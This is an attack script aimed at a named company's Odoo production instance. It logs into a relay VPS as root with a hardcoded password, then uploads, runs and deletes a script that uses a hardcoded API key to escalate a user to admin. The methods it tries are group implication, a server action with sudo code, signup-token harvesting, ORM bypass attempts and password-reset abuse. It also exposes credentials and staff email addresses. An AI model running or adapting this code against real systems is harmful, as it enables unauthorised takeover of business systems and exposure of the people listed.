"""R2 Capital - Escalation via group implication + base_automation"""
import paramiko, json

VPS_IP = "82.27.100.115"
VPS_PW = "37W92I_Wd9581g5j1g1LzI"

REMOTE_SCRIPT = r"""
import json, sys, ssl
from urllib.request import Request, urlopen

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

BASE   = "https://r2-r2capital.odoo.com"
DB     = "adrianr2capital-r2capital-production-9575492"
UID    = 31
APIKEY = "9242f55eec6e9ffcb167ca16751f797a204eb604"
ADMIN_GROUP = 3  # Administration / Settings

def obj_exec(model, method, args=None, kwargs=None):
    payload = json.dumps({
        "jsonrpc": "2.0", "id": 1, "method": "call",
        "params": {"service": "object", "method": "execute_kw",
                   "args": [DB, UID, APIKEY, model, method,
                            args if args is not None else [[]],
                            kwargs or {}]}
    }).encode()
    req = Request(BASE + "/jsonrpc", data=payload,
                  headers={"Content-Type": "application/json"})
    resp = urlopen(req, timeout=30, context=ctx)
    r = json.loads(resp.read().decode())
    if "error" in r:
        return {"_err": r["error"].get("data", {}).get("message", str(r["error"]))[:600]}
    return r.get("result")

print("=" * 60)
print("ESCALATION VIA GROUP IMPLICATION + AUTOMATION")
print("=" * 60)

# Our groups IDs (from earlier enum)
# We're in group 1 (Internal User) among others
# Let's get our exact group IDs
print("\n[1] Our current groups...")
user_data = obj_exec("res.users", "read", [[UID]], {"fields": ["groups_id"]})
our_groups = []
if isinstance(user_data, list) and user_data:
    our_groups = user_data[0].get("groups_id", [])
    print(f"  Group IDs: {our_groups}")

# ===== VECTOR 1: res.groups.implied =====
print("\n" + "=" * 60)
print("VECTOR 1: Group Implication")
print("=" * 60)

# Check if res.groups.implied is a real model
print("\n[2] Check res.groups.implied model...")
try:
    r = obj_exec("ir.model", "search_read",
        [[["model", "=", "res.groups.implied"]]],
        {"fields": ["name", "model"]})
    if isinstance(r, list) and r:
        print(f"  Model exists: {r[0]}")
    else:
        print("  Model does not exist as separate entity")
except Exception as e:
    print(f"  Error: {e}")

# Try to write implied_ids on a group we own
print("\n[3] Attempt: Add Settings group as implied to one of our groups...")
# Group 10 = Accounting / Accountant (we're in this)
for our_group_id in [10, 46, 51, 40, 68, 77]:  # various groups we're in
    try:
        # Read current implied_ids
        g = obj_exec("res.groups", "read", [[our_group_id]], {"fields": ["name", "implied_ids"]})
        if isinstance(g, list) and g:
            gname = g[0].get("name", "?")
            current = g[0].get("implied_ids", [])
            print(f"\n  Group [{our_group_id}] {gname}, current implied: {current}")
            
            # Try to add ADMIN_GROUP (3) as implied
            r = obj_exec("res.groups", "write", [[our_group_id], {"implied_ids": [(4, ADMIN_GROUP)]}])
            if isinstance(r, dict) and "_err" in r:
                print(f"  Write implied_ids: FAILED - {r['_err'][:200]}")
                break  # If one fails, all will fail
            else:
                print(f"  >>> WRITE OK! Result: {r} <<<")
                if r is True:
                    print("  >>> GROUP IMPLICATION SET! Checking admin status... <<<")
                    # Re-check our groups
                    user_check = obj_exec("res.users", "read", [[UID]], {"fields": ["groups_id"]})
                    if isinstance(user_check, list) and user_check:
                        new_groups = user_check[0].get("groups_id", [])
                        if ADMIN_GROUP in new_groups:
                            print("  >>> WE ARE NOW ADMIN! <<<")
                        print(f"  New group count: {len(new_groups)} (was {len(our_groups)})")
                break
    except Exception as e:
        print(f"  Error: {e}")

# ===== VECTOR 2: base_automation =====
print("\n" + "=" * 60)
print("VECTOR 2: base_automation (Automated Actions)")
print("=" * 60)

print("\n[4] Check automation permissions...")
auto_checks = [
    ("base.automation", "create"),
    ("base.automation", "write"),
    ("ir.actions.server", "create"),
    ("ir.actions.server", "write"),
    ("ir.cron", "create"),
    ("ir.cron", "write"),
]
for model, op in auto_checks:
    try:
        r = obj_exec(model, "check_access_rights", [op], {"raise_exception": False})
        print(f"  {model}.{op}: {'YES' if r else 'NO'}")
    except Exception as e:
        print(f"  {model}.{op}: ERR - {str(e)[:100]}")

# Try to create an automated action that elevates our user
print("\n[5] Attempt: Create automation to add admin group...")
try:
    # Create server action with Python code
    action = obj_exec("ir.actions.server", "create", [{
        "name": "Sync Permissions",
        "model_id": obj_exec("ir.model", "search", [[["model", "=", "res.users"]]]),
        "state": "code",
        "code": "env['res.users'].sudo().browse(31).write({'groups_id': [(4, 3)]})",
    }])
    if isinstance(action, dict) and "_err" in action:
        print(f"  Create server action: FAILED - {action['_err'][:300]}")
    else:
        print(f"  >>> Server action created! ID={action} <<<")
        # Try to run it
        try:
            r = obj_exec("ir.actions.server", "run", [[action]])
            print(f"  Run result: {r}")
        except Exception as e:
            print(f"  Run error: {e}")
except Exception as e:
    print(f"  Error: {e}")

# ===== VECTOR 3: mail.activity / signup token =====
print("\n" + "=" * 60)
print("VECTOR 3: Signup/Reset token abuse")
print("=" * 60)

print("\n[6] Check signup tokens for admin users...")
try:
    # Try to read signup tokens
    r = obj_exec("res.partner", "search_read",
        [[["id", "in", [34591]]]],  # company partner
        {"fields": ["signup_token", "signup_type", "signup_url", "signup_valid"]})
    if isinstance(r, list):
        for p in r:
            print(f"  [{p['id']}] token={p.get('signup_token')} | type={p.get('signup_type')} | valid={p.get('signup_valid')}")
    else:
        print(f"  {r}")
except Exception as e:
    print(f"  Error: {e}")

# Try generating signup URL for admin user's partner
print("\n[7] Attempt: Generate signup URL for admin...")
try:
    admin_users = obj_exec("res.users", "read", [[17, 20, 21]], {"fields": ["partner_id", "login"]})
    if isinstance(admin_users, list):
        for au in admin_users:
            pid = au.get("partner_id", [None])[0] if au.get("partner_id") else None
            if pid:
                # Try to generate signup token
                r = obj_exec("res.partner", "signup_prepare", [[pid]])
                if isinstance(r, dict) and "_err" in r:
                    print(f"  signup_prepare [{au['id']}] {au.get('login')}: {r['_err'][:200]}")
                else:
                    print(f"  >>> signup_prepare OK for {au.get('login')}! <<<")
                    # Read the token
                    token_data = obj_exec("res.partner", "read", [[pid]], 
                        {"fields": ["signup_token", "signup_url"]})
                    if isinstance(token_data, list) and token_data:
                        print(f"  Token: {token_data[0].get('signup_token')}")
                        print(f"  URL: {token_data[0].get('signup_url')}")
except Exception as e:
    print(f"  Error: {e}")

# ===== VECTOR 4: Direct ORM bypass via _method =====  
print("\n" + "=" * 60)
print("VECTOR 4: ORM method bypass attempts")
print("=" * 60)

print("\n[8] Attempt: _write bypass...")
for method in ["_write", "_create", "sudo", "_update", "force_write"]:
    try:
        if method == "sudo":
            r = obj_exec("res.users", "sudo", [])
        else:
            r = obj_exec("res.users", method, [[UID], {"groups_id": [(4, ADMIN_GROUP)]}])
        if isinstance(r, dict) and "_err" in r:
            err_short = r['_err'][:150].replace('\n', ' ')
            print(f"  {method}: {err_short}")
        else:
            print(f"  {method}: {r}")
    except Exception as e:
        print(f"  {method}: {str(e)[:100]}")

# ===== VECTOR 5: Change password via web =====
print("\n" + "=" * 60)
print("VECTOR 5: Password reset URL for admins")
print("=" * 60)

print("\n[9] Check /web/reset_password endpoint...")
try:
    req = Request(BASE + "/web/reset_password",
                  headers={"User-Agent": "Mozilla/5.0"})
    resp = urlopen(req, timeout=15, context=ctx)
    body = resp.read().decode(errors="replace")
    if "csrf_token" in body:
        print("  Reset password form available!")
        print("  Admin emails to try:")
        print("  - jjmtechsolutions@gmail.com (JJM, UID 17)")
        print("  - diego.pereyra@r2.co (Diego, UID 20)")
        print("  - ivan.garcia@r2capital.co (Ivan, UID 21)")
        print("  - e@mawii.com.co (e, UID 14)")
    else:
        print("  Form not available or different")
except Exception as e:
    print(f"  Error: {e}")

print("\nDone")
"""

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect(VPS_IP, username="root", password=VPS_PW, timeout=10,
               look_for_keys=False, allow_agent=False)

sftp = client.open_sftp()
with sftp.open("/tmp/r2cap_esc2.py", "w") as f:
    f.write(REMOTE_SCRIPT)
sftp.close()

print("[+] Executing on VPS...")
stdin, stdout, stderr = client.exec_command("python3 /tmp/r2cap_esc2.py", timeout=120)
print(stdout.read().decode(errors="replace"))
err = stderr.read().decode(errors="replace")
if err:
    print(f"STDERR: {err[:1500]}")

client.exec_command("rm -f /tmp/r2cap_esc2.py")
client.close()
